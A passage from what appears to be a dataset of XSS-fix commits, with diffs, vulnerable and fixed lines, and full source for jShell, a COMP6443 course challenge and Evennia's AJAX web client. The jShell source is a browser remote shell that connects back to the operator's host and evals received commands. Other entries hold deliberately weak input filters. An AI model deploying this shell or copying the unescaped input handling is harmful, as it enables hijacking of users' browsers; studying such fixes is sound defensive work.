                    "source": "\nfrom flask_socketio import SocketIO,emit from flask import Flask, render_template, session,request,flash,redirect,url_for import sys if len(sys.argv)<3: print \"Usage: python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit() PORT=sys.argv[2].strip() HOST=sys.argv[1].strip() print \"Listening on\",HOST+\":\"+PORT app=Flask(__name__) app.secret_key='I Am Batman.' access_key=\"Tony Stark Is The Best.\" session_id=\"This guy fucks!\" socketio=SocketIO(app) html=''' <div id=history></div> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script> <script> ''' html=html+\"var socket=io.connect('http://{}:{}');\".format(HOST,PORT) html=html+''' try{setTimeout(` socket.emit('sendMSG','Connection Established.') `,1000) } catch{} socket.on('getMSG',function(data){ document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"]</font>\"; try{ output=eval(data)+\"\" } catch(e){ output=e+\"\" } socket.emit('sendMSG',output) }) </script> ''' @app.route('/',methods=['GET']) def shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command+\"\\n\") if command==\"exit\": exit() if __name__=='__main__': socketio.run(app,debug=True,host=HOST,port=int(PORT)) ",
                    "sourceWithComments": "from flask_socketio import SocketIO,emit\nfrom flask import Flask, render_template, session,request,flash,redirect,url_for\nimport sys\n\nif len(sys.argv)<3:\n    print \"Usage : python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\"\n    exit()\n\nPORT=sys.argv[2].strip()\nHOST=sys.argv[1].strip()\n\nprint \"Listening on\",HOST+\":\"+PORT\n\napp = Flask(__name__)\napp.secret_key='I Am Batman.'\naccess_key=\"Tony Stark Is The Best.\"\nsession_id=\"This guy fucks!\"\nsocketio = SocketIO(app)\n\nhtml='''\n<div id=history></div>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script>\n\n<script>\n'''    \nhtml=html+\"var socket = io.connect('http://{}:{}');\".format(HOST,PORT)\n\nhtml=html+'''\n    try{setTimeout(`\n            socket.emit('sendMSG','Connection Established.')\n        `,1000)\n     }\n\n    catch{}\n\n    socket.on('getMSG',function(data){\n        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data+\"]</font>\";\n        try{\n             output=eval(data)+\"\"\n        }\n        catch(e){\n            output=e+\"\"\n        }\n        socket.emit('sendMSG',output)\n    })\n</script>\n'''\n\n@app.route('/',methods = ['GET'])\ndef shell():\n    return html\n\n@socketio.on('sendMSG')\ndef sendMSG(message): #Get MSG from Client\n    print(\"OUTPUT> \"+str(message))\n    command=raw_input(\"CMD> \")\n    emit(\"getMSG\",command+\"\\n\")\n    if command==\"exit\":\n        exit()\n\nif __name__ == '__main__':\n   socketio.run(app,debug=True,host=HOST,port=int(PORT))\n\n"
                }
            },
            "msg": "Fix XSS + Removed Unused Libraries"
        }
    },
    "https://github.com/TAbdiukov/COMP6443-patch-last": {
        "59156d7040f96c076421414bce17ae96a970cd3a": {
            "url": "https://api.github.com/repos/TAbdiukov/COMP6443-patch-last/commits/59156d7040f96c076421414bce17ae96a970cd3a",
            "html_url": "https://github.com/TAbdiukov/COMP6443-patch-last/commit/59156d7040f96c076421414bce17ae96a970cd3a",
            "message": "fix XSS problem",
            "sha": "59156d7040f96c076421414bce17ae96a970cd3a",
            "keyword": "XSS fix",
            "diff": "diff --git a/squiggle_xss/app/squiggle_patch/main/views.py b/squiggle_xss/app/squiggle_patch/main/views.py\nindex 64b28c4..53b177b 100644\n--- a/squiggle_xss/app/squiggle_patch/main/views.py\n+++ b/squiggle_xss/app/squiggle_patch/main/views.py\n@@ -1,5 +1,6 @@\n #!/usr/bin/env python3\n import random\n+import html # for counter-xss escaping\n \n from flask import url_for, redirect, render_template, request\n \n@@ -8,19 +9,21 @@\n \n @app.route(\"/\")\n def root():\n-    return render_template(\"home.html\")\n-\n+\treturn render_template(\"home.html\")\n \n @app.route(\"/interact\", methods=[\"POST\"])\n def vuln():\n-    msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n-    responses = [\n-        \"send help\",\n-        \"what is my purpose\",\n-        \"donate to us via bitcoin at: {{ bitcoin_address }}\",\n-        \"donate to us via paypal at: {{ paypal_address }}\",\n-        \"donate to us via venmo at: {{ venmo_address }}\",\n-        \"donate to us via beemit at: {{ beemit_address }}\",\n-    ]\n+\t#msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n+\t# replace approach is no good\n+\tmsg = html.escape(request.form[\"message\"])\n+\t\n+\tresponses = [\n+\t\t\"send help\",\n+\t\t\"what is my purpose\",\n+\t\t\"donate to us via bitcoin at: {{ bitcoin_address }}\",\n+\t\t\"donate to us via paypal at: {{ paypal_address }}\",\n+\t\t\"donate to us via venmo at: {{ venmo_address }}\",\n+\t\t\"donate to us via beemit at: {{ beemit_address }}\",\n+\t]\n \n-    return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n+\treturn render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n",
            "files": {
                "/squiggle_xss/app/squiggle_patch/main/views.py": {
                    "changes": [
                        {
                            "diff": "\n @app.route(\"/\")\n def root():\n-    return render_template(\"home.html\")\n-\n+\treturn render_template(\"home.html\")\n \n @app.route(\"/interact\", methods=[\"POST\"])\n def vuln():\n-    msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n-    responses = [\n-        \"send help\",\n-        \"what is my purpose\",\n-        \"donate to us via bitcoin at: {{ bitcoin_address }}\",\n-        \"donate to us via paypal at: {{ paypal_address }}\",\n-        \"donate to us via venmo at: {{ venmo_address }}\",\n-        \"donate to us via beemit at: {{ beemit_address }}\",\n-    ]\n+\t#msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n+\t# replace approach is no good\n+\tmsg = html.escape(request.form[\"message\"])\n+\t\n+\tresponses = [\n+\t\t\"send help\",\n+\t\t\"what is my purpose\",\n+\t\t\"donate to us via bitcoin at: {{ bitcoin_address }}\",\n+\t\t\"donate to us via paypal at: {{ paypal_address }}\",\n+\t\t\"donate to us via venmo at: {{ venmo_address }}\",\n+\t\t\"donate to us via beemit at: {{ beemit_address }}\",\n+\t]\n \n-    return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n+\treturn render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n",
                            "add": 14,
                            "remove": 12,
                            "filename": "/squiggle_xss/app/squiggle_patch/main/views.py",
                            "badparts": [
                                "    return render_template(\"home.html\")",
                                "    msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')",
                                "    responses = [",
                                "        \"send help\",",
                                "        \"what is my purpose\",",
                                "        \"donate to us via bitcoin at: {{ bitcoin_address }}\",",
                                "        \"donate to us via paypal at: {{ paypal_address }}\",",
                                "        \"donate to us via venmo at: {{ venmo_address }}\",",
                                "        \"donate to us via beemit at: {{ beemit_address }}\",",
                                "    ]",
                                "    return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))"
                            ],
                            "goodparts": [
                                "\treturn render_template(\"home.html\")",
                                "\tmsg = html.escape(request.form[\"message\"])",
                                "\t",
                                "\tresponses = [",
                                "\t\t\"send help\",",
                                "\t\t\"what is my purpose\",",
                                "\t\t\"donate to us via bitcoin at: {{ bitcoin_address }}\",",
                                "\t\t\"donate to us via paypal at: {{ paypal_address }}\",",
                                "\t\t\"donate to us via venmo at: {{ venmo_address }}\",",
                                "\t\t\"donate to us via beemit at: {{ beemit_address }}\",",
                                "\t]",
                                "\treturn render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))"
                            ]
                        }
                    ],
                    "source": "\n\nimport random from flask import url_for, redirect, render_template, request from. import bp as app @app.route(\"/\") def root(): return render_template(\"home.html\") @app.route(\"/interact\", methods=[\"POST\"]) def vuln(): msg=request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu') responses=[ \"send help\", \"what is my purpose\", \"donate to us via bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at:{{ venmo_address}}\", \"donate to us via beemit at:{{ beemit_address}}\", ] return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses)) ",
                    "sourceWithComments": "#!/usr/bin/env python3\nimport random\n\nfrom flask import url_for, redirect, render_template, request\n\nfrom . import bp as app  # Note that app = blueprint, current_app = flask context\n\n\n@app.route(\"/\")\ndef root():\n    return render_template(\"home.html\")\n\n\n@app.route(\"/interact\", methods=[\"POST\"])\ndef vuln():\n    msg = request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')\n    responses = [\n        \"send help\",\n        \"what is my purpose\",\n        \"donate to us via bitcoin at: {{ bitcoin_address }}\",\n        \"donate to us via paypal at: {{ paypal_address }}\",\n        \"donate to us via venmo at: {{ venmo_address }}\",\n        \"donate to us via beemit at: {{ beemit_address }}\",\n    ]\n\n    return render_template(\"chatbot.html\", msg=msg, resp=random.choice(responses))\n"
                }
            },
            "msg": "fix XSS problem"
        }
    },
    "https://github.com/evennia/evennia": {
        "300261529b82f95414c9d1d7150d6eda4695bb93": {
            "url": "https://api.github.com/repos/evennia/evennia/commits/300261529b82f95414c9d1d7150d6eda4695bb93",
            "html_url": "https://github.com/evennia/evennia/commit/300261529b82f95414c9d1d7150d6eda4695bb93",
            "message": "Escape AJAX session input to better protect against XSS attacks. Resolve #1846",
            "sha": "300261529b82f95414c9d1d7150d6eda4695bb93",
            "keyword": "XSS attack",
            "diff": "diff --git a/evennia/server/portal/webclient_ajax.py b/evennia/server/portal/webclient_ajax.py\nindex aa774e265..5c310aedf 100644\n--- a/evennia/server/portal/webclient_ajax.py\n+++ b/evennia/server/portal/webclient_ajax.py\n@@ -19,6 +19,7 @@\n import json\n import re\n import time\n+import cgi\n \n from twisted.web import server, resource\n from twisted.internet.task import LoopingCall\n@@ -35,12 +36,12 @@\n _SERVERNAME = settings.SERVERNAME\n _KEEPALIVE = 30  # how often to check keepalive\n \n+\n # defining a simple json encoder for returning\n # django data to the client. Might need to\n # extend this if one wants to send more\n # complex database objects too.\n \n-\n class LazyEncoder(json.JSONEncoder):\n     def default(self, obj):\n         if isinstance(obj, Promise):\n@@ -158,7 +159,7 @@ def mode_init(self, request):\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n \n         remote_addr = request.getClientIP()\n         host_string = \"%s (%s:%s)\" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)\n@@ -190,7 +191,7 @@ def mode_keepalive(self, request):\n         This is called by render_POST when the\n         client is replying to the keepalive.\n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n         return '\"\"'\n \n@@ -203,13 +204,12 @@ def mode_input(self, request):\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n-\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n         sess = self.sessionhandler.sessions_from_csessid(csessid)\n         if sess:\n             sess = sess[0]\n-            cmdarray = json.loads(request.args.get('data')[0])\n+            cmdarray = json.loads(cgi.escape(request.args.get('data')[0]))\n             sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})\n         return '\"\"'\n \n@@ -224,7 +224,7 @@ def mode_receive(self, request):\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n \n         dataentries = self.databuffer.get(csessid, [])\n@@ -245,7 +245,7 @@ def mode_close(self, request):\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         try:\n             sess = self.sessionhandler.sessions_from_csessid(csessid)[0]\n             sess.sessionhandler.disconnect(sess)\n@@ -267,6 +267,7 @@ def render_POST(self, request):\n \n         \"\"\"\n         dmode = request.args.get('mode', [None])[0]\n+\n         if dmode == 'init':\n             # startup. Setup the server.\n             return self.mode_init(request)\n",
            "files": {
                "/evennia/server/portal/webclient_ajax.py": {
                    "changes": [
                        {
                            "diff": "\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n \n         remote_addr = request.getClientIP()\n         host_string = \"%s (%s:%s)\" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/evennia/server/portal/webclient_ajax.py",
                            "badparts": [
                                "        csessid = request.args.get('csessid')[0]"
                            ],
                            "goodparts": [
                                "        csessid = cgi.escape(request.args['csessid'][0])"
                            ]
                        },
                        {
                            "diff": "\n         This is called by render_POST when the\n         client is replying to the keepalive.\n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n         return '\"\"'\n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/evennia/server/portal/webclient_ajax.py",
                            "badparts": [
                                "        csessid = request.args.get('csessid')[0]"
                            ],
                            "goodparts": [
                                "        csessid = cgi.escape(request.args['csessid'][0])"
                            ]
                        },
                        {
                            "diff": "\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n-\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n         sess = self.sessionhandler.sessions_from_csessid(csessid)\n         if sess:\n             sess = sess[0]\n-            cmdarray = json.loads(request.args.get('data')[0])\n+            cmdarray = json.loads(cgi.escape(request.args.get('data')[0]))\n             sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})\n         return '\"\"'\n \n",
                            "add": 2,
                            "remove": 3,
                            "filename": "/evennia/server/portal/webclient_ajax.py",
                            "badparts": [
                                "        csessid = request.args.get('csessid')[0]",
                                "            cmdarray = json.loads(request.args.get('data')[0])"
                            ],
                            "goodparts": [
                                "        csessid = cgi.escape(request.args['csessid'][0])",
                                "            cmdarray = json.loads(cgi.escape(request.args.get('data')[0]))"
                            ]
                        },
                        {
                            "diff": "\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         self.last_alive[csessid] = (time.time(), False)\n \n         dataentries = self.databuffer.get(csessid, [])\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/evennia/server/portal/webclient_ajax.py",
                            "badparts": [
                                "        csessid = request.args.get('csessid')[0]"
                            ],
                            "goodparts": [
                                "        csessid = cgi.escape(request.args['csessid'][0])"
                            ]
                        },
                        {
                            "diff": "\n             request (Request): Incoming request.\n \n         \"\"\"\n-        csessid = request.args.get('csessid')[0]\n+        csessid = cgi.escape(request.args['csessid'][0])\n         try:\n             sess = self.sessionhandler.sessions_from_csessid(csessid)[0]\n             sess.sessionhandler.disconnect(sess)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/evennia/server/portal/webclient_ajax.py",
                            "badparts": [
                                "        csessid = request.args.get('csessid')[0]"
                            ],
                            "goodparts": [
                                "        csessid = cgi.escape(request.args['csessid'][0])"
                            ]
                        }
                    ],
                    "source": "\n\"\"\" AJAX/COMET fallback webclient The AJAX/COMET web client consists of two components running on twisted and django. They are both a part of the Evennia website url tree(so the testing website might be located on http://localhost:4001/, whereas the webclient can be found on http://localhost:4001/webclient.) /webclient -this url is handled through django's template system and serves the html page for the client itself along with its javascript chat program. /webclientdata -this url is called by the ajax chat using POST requests(long-polling when necessary) The WebClient resource in this module will handle these requests and act as a gateway to sessions connected over the webclient. \"\"\" import json import re import time from twisted.web import server, resource from twisted.internet.task import LoopingCall from django.utils.functional import Promise from django.utils.encoding import force_unicode from django.conf import settings from evennia.utils.ansi import parse_ansi from evennia.utils import utils from evennia.utils.text2html import parse_html from evennia.server import session _CLIENT_SESSIONS=utils.mod_import(settings.SESSION_ENGINE).SessionStore _RE_SCREENREADER_REGEX=re.compile(r\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL +re.MULTILINE) _SERVERNAME=settings.SERVERNAME _KEEPALIVE=30 class LazyEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj, Promise): return force_unicode(obj) return super(LazyEncoder, self).default(obj) def jsonify(obj): return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder)) class AjaxWebClient(resource.Resource): \"\"\" An ajax/comet long-polling transport \"\"\" isLeaf=True allowedMethods=('POST',) def __init__(self): self.requests={} self.databuffer={} self.last_alive={} self.keep_alive=None def _responseFailed(self, failure, csessid, request): \"callback if a request is lost/timed out\" try: del self.requests[csessid] except KeyError: pass def _keepalive(self): \"\"\" Callback for checking the connection is still alive. \"\"\" now=time.time() to_remove=[] keep_alives=((csessid, remove) for csessid,(t, remove) in self.last_alive.iteritems() if now -t > _KEEPALIVE) for csessid, remove in keep_alives: if remove: to_remove.append(csessid) else: self.last_alive[csessid]=(now, True) self.lineSend(csessid,[\"ajax_keepalive\",[],{}]) for csessid in to_remove: sessions=self.sessionhandler.sessions_from_csessid(csessid) for sess in sessions: sess.disconnect() self.last_alive.pop(csessid, None) if not self.last_alive: self.keep_alive.stop() self.keep_alive=None def at_login(self): \"\"\" Called when this session gets authenticated by the server. \"\"\" pass def lineSend(self, csessid, data): \"\"\" This adds the data to the buffer and/or sends it to the client as soon as possible. Args: csessid(int): Session id. data(list): A send structure[cmdname,[args],{kwargs}]. \"\"\" request=self.requests.get(csessid) if request: request.write(jsonify(data)) request.finish() del self.requests[csessid] else: dataentries=self.databuffer.get(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid]=dataentries def client_disconnect(self, csessid): \"\"\" Disconnect session with given csessid. Args: csessid(int): Session id. \"\"\" if csessid in self.requests: self.requests[csessid].finish() del self.requests[csessid] if csessid in self.databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by render_POST when the client requests an init mode operation(at startup) Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] remote_addr=request.getClientIP() host_string=\"%s(%s:%s)\" %(_SERVERNAME, request.getRequestHostname(), request.getHost().port) sess=AjaxWebClientSession() sess.client=self sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler) sess.csessid=csessid csession=_CLIENT_SESSIONS(session_key=sess.csessid) uid=csession and csession.get(\"webclient_authenticated_uid\", False) if uid: sess.uid=uid sess.logged_in=True sess.sessionhandler.connect(sess) self.last_alive[csessid]=(time.time(), False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid}) def mode_keepalive(self, request): \"\"\" This is called by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) return '\"\"' def mode_input(self, request): \"\"\" This is called by render_POST when the client is sending data to the server. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) sess=self.sessionhandler.sessions_from_csessid(csessid) if sess: sess=sess[0] cmdarray=json.loads(request.args.get('data')[0]) sess.sessionhandler.data_in(sess, **{cmdarray[0]:[cmdarray[1], cmdarray[2]]}) return '\"\"' def mode_receive(self, request): \"\"\" This is called by render_POST when the client is telling us that it is ready to receive data as soon as it is available. This is the basis of a long-polling(comet) mechanism: the server will wait to reply until data is available. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) dataentries=self.databuffer.get(csessid,[]) if dataentries: return dataentries.pop(0) request.notifyFinish().addErrback(self._responseFailed, csessid, request) if csessid in self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server.NOT_DONE_YET def mode_close(self, request): \"\"\" This is called by render_POST when the client is signalling that it is about to be closed. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] try: sess=self.sessionhandler.sessions_from_csessid(csessid)[0] sess.sessionhandler.disconnect(sess) except IndexError: self.client_disconnect(csessid) return '\"\"' def render_POST(self, request): \"\"\" This function is what Twisted calls with POST requests coming in from the ajax client. The requests should be tagged with different modes depending on what needs to be done, such as initializing or sending/receving data through the request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0] if dmode=='init': return self.mode_init(request) elif dmode=='input': return self.mode_input(request) elif dmode=='receive': return self.mode_receive(request) elif dmode=='close': return self.mode_close(request) elif dmode=='keepalive': return self.mode_keepalive(request) else: return '\"\"' class AjaxWebClientSession(session.Session): \"\"\" This represents a session running in an AjaxWebclient. \"\"\" def __init__(self, *args, **kwargs): self.protocol_key=\"webclient/ajax\" super(AjaxWebClientSession, self).__init__(*args, **kwargs) def get_client_session(self): \"\"\" Get the Client browser session(used for auto-login based on browser session) Returns: csession(ClientSession): This is a django-specific internal representation of the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key=self.csessid) def disconnect(self, reason=\"Server disconnected.\"): \"\"\" Disconnect from server. Args: reason(str): Motivation for the disconnect. \"\"\" csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=None csession.save() self.logged_in=False self.client.lineSend(self.csessid,[\"connection_close\",[reason],{}]) self.client.client_disconnect(self.csessid) self.sessionhandler.disconnect(self) def at_login(self): csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=self.uid csession.save() def data_out(self, **kwargs): \"\"\" Data Evennia -> User Kwargs: kwargs(any): Options to the protocol \"\"\" self.sessionhandler.data_out(self, **kwargs) def send_text(self, *args, **kwargs): \"\"\" Send text data. This will pre-process the text for color-replacement, conversion to html etc. Args: text(str): Text to send. Kwargs: options(dict): Options-dict with the following keys understood: -raw(bool): No parsing at all(leave ansi-to-html markers unparsed). -nocolor(bool): Remove all color. -screenreader(bool): Use Screenreader mode. -send_prompt(bool): Send a prompt with parsed html \"\"\" if args: args=list(args) text=args[0] if text is None: return else: return flags=self.protocol_flags text=utils.to_str(text, force_string=True) options=kwargs.pop(\"options\",{}) raw=options.get(\"raw\", flags.get(\"RAW\", False)) xterm256=options.get(\"xterm256\", flags.get('XTERM256', True)) useansi=options.get(\"ansi\", flags.get('ANSI', True)) nocolor=options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not(xterm256 or useansi)) screenreader=options.get(\"screenreader\", flags.get(\"SCREENREADER\", False)) prompt=options.get(\"send_prompt\", False) if screenreader: text=parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False) text=_RE_SCREENREADER_REGEX.sub(\"\", text) cmd=\"prompt\" if prompt else \"text\" if raw: args[0]=text else: args[0]=parse_html(text, strip_ansi=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs): kwargs[\"options\"].update({\"send_prompt\": True}) self.send_text(*args, **kwargs) def send_default(self, cmdname, *args, **kwargs): \"\"\" Data Evennia -> User. Args: cmdname(str): The first argument will always be the oob cmd name. *args(any): Remaining args will be arguments for `cmd`. Kwargs: options(dict): These are ignored for oob commands. Use command arguments(which can hold dicts) to send instructions to the client instead. \"\"\" if not cmdname==\"options\": self.client.lineSend(self.csessid,[cmdname, args, kwargs]) ",
                    "sourceWithComments": "\"\"\"\nAJAX/COMET fallback webclient\n\nThe AJAX/COMET web client consists of two components running on\ntwisted and django. They are both a part of the Evennia website url\ntree (so the testing website might be located on\nhttp://localhost:4001/, whereas the webclient can be found on\nhttp://localhost:4001/webclient.)\n\n/webclient - this url is handled through django's template\n             system and serves the html page for the client\n             itself along with its javascript chat program.\n/webclientdata - this url is called by the ajax chat using\n                 POST requests (long-polling when necessary)\n                 The WebClient resource in this module will\n                 handle these requests and act as a gateway\n                 to sessions connected over the webclient.\n\"\"\"\nimport json\nimport re\nimport time\n\nfrom twisted.web import server, resource\nfrom twisted.internet.task import LoopingCall\nfrom django.utils.functional import Promise\nfrom django.utils.encoding import force_unicode\nfrom django.conf import settings\nfrom evennia.utils.ansi import parse_ansi\nfrom evennia.utils import utils\nfrom evennia.utils.text2html import parse_html\nfrom evennia.server import session\n\n_CLIENT_SESSIONS = utils.mod_import(settings.SESSION_ENGINE).SessionStore\n_RE_SCREENREADER_REGEX = re.compile(r\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL + re.MULTILINE)\n_SERVERNAME = settings.SERVERNAME\n_KEEPALIVE = 30  # how often to check keepalive\n\n# defining a simple json encoder for returning\n# django data to the client. Might need to\n# extend this if one wants to send more\n# complex database objects too.\n\n\nclass LazyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, Promise):\n            return force_unicode(obj)\n        return super(LazyEncoder, self).default(obj)\n\n\ndef jsonify(obj):\n    return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder))\n\n\n#\n# AjaxWebClient resource - this is called by the ajax client\n# using POST requests to /webclientdata.\n#\n\nclass AjaxWebClient(resource.Resource):\n    \"\"\"\n    An ajax/comet long-polling transport\n\n    \"\"\"\n    isLeaf = True\n    allowedMethods = ('POST',)\n\n    def __init__(self):\n        self.requests = {}\n        self.databuffer = {}\n\n        self.last_alive = {}\n        self.keep_alive = None\n\n    def _responseFailed(self, failure, csessid, request):\n        \"callback if a request is lost/timed out\"\n        try:\n            del self.requests[csessid]\n        except KeyError:\n            # nothing left to delete\n            pass\n\n    def _keepalive(self):\n        \"\"\"\n        Callback for checking the connection is still alive.\n        \"\"\"\n        now = time.time()\n        to_remove = []\n        keep_alives = ((csessid, remove) for csessid, (t, remove)\n                       in self.last_alive.iteritems() if now - t > _KEEPALIVE)\n        for csessid, remove in keep_alives:\n            if remove:\n                # keepalive timeout. Line is dead.\n                to_remove.append(csessid)\n            else:\n                # normal timeout - send keepalive\n                self.last_alive[csessid] = (now, True)\n                self.lineSend(csessid, [\"ajax_keepalive\", [], {}])\n        # remove timed-out sessions\n        for csessid in to_remove:\n            sessions = self.sessionhandler.sessions_from_csessid(csessid)\n            for sess in sessions:\n                sess.disconnect()\n            self.last_alive.pop(csessid, None)\n            if not self.last_alive:\n                # no more ajax clients. Stop the keepalive\n                self.keep_alive.stop()\n                self.keep_alive = None\n\n    def at_login(self):\n        \"\"\"\n        Called when this session gets authenticated by the server.\n        \"\"\"\n        pass\n\n    def lineSend(self, csessid, data):\n        \"\"\"\n        This adds the data to the buffer and/or sends it to the client\n        as soon as possible.\n\n        Args:\n            csessid (int): Session id.\n            data (list): A send structure [cmdname, [args], {kwargs}].\n\n        \"\"\"\n        request = self.requests.get(csessid)\n        if request:\n            # we have a request waiting. Return immediately.\n            request.write(jsonify(data))\n            request.finish()\n            del self.requests[csessid]\n        else:\n            # no waiting request. Store data in buffer\n            dataentries = self.databuffer.get(csessid, [])\n            dataentries.append(jsonify(data))\n            self.databuffer[csessid] = dataentries\n\n    def client_disconnect(self, csessid):\n        \"\"\"\n        Disconnect session with given csessid.\n\n        Args:\n            csessid (int): Session id.\n\n        \"\"\"\n        if csessid in self.requests:\n            self.requests[csessid].finish()\n            del self.requests[csessid]\n        if csessid in self.databuffer:\n            del self.databuffer[csessid]\n\n    def mode_init(self, request):\n        \"\"\"\n        This is called by render_POST when the client requests an init\n        mode operation (at startup)\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n\n        remote_addr = request.getClientIP()\n        host_string = \"%s (%s:%s)\" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)\n\n        sess = AjaxWebClientSession()\n        sess.client = self\n        sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler)\n\n        sess.csessid = csessid\n        csession = _CLIENT_SESSIONS(session_key=sess.csessid)\n        uid = csession and csession.get(\"webclient_authenticated_uid\", False)\n        if uid:\n            # the client session is already logged in\n            sess.uid = uid\n            sess.logged_in = True\n\n        sess.sessionhandler.connect(sess)\n\n        self.last_alive[csessid] = (time.time(), False)\n        if not self.keep_alive:\n            # the keepalive is not running; start it.\n            self.keep_alive = LoopingCall(self._keepalive)\n            self.keep_alive.start(_KEEPALIVE, now=False)\n\n        return jsonify({'msg': host_string, 'csessid': csessid})\n\n    def mode_keepalive(self, request):\n        \"\"\"\n        This is called by render_POST when the\n        client is replying to the keepalive.\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n        self.last_alive[csessid] = (time.time(), False)\n        return '\"\"'\n\n    def mode_input(self, request):\n        \"\"\"\n        This is called by render_POST when the client\n        is sending data to the server.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n\n        self.last_alive[csessid] = (time.time(), False)\n        sess = self.sessionhandler.sessions_from_csessid(csessid)\n        if sess:\n            sess = sess[0]\n            cmdarray = json.loads(request.args.get('data')[0])\n            sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})\n        return '\"\"'\n\n    def mode_receive(self, request):\n        \"\"\"\n        This is called by render_POST when the client is telling us\n        that it is ready to receive data as soon as it is available.\n        This is the basis of a long-polling (comet) mechanism: the\n        server will wait to reply until data is available.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n        self.last_alive[csessid] = (time.time(), False)\n\n        dataentries 